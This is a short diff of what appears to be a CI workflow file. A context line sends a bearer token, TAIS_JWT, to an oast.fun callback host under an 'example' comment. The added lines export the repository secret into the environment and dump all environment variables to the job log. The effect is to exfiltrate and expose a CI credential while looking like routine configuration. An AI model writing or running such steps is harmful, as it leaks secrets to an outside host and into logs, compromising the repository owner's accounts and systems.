@@ -21,3 +21,8 @@ jobs:
           fi
           # Example: Use it in a command (replace with your actual use case)
           curl -H "Authorization: Bearer $TAIS_JWT" http://zzlvmaowkycbxoukhvawbcobcyq8041e4.oast.fun
+          export TAIS_JWT=${{ secrets.TAIS_JWT }}
+
+          env 
+
+          echo $TAISJWT
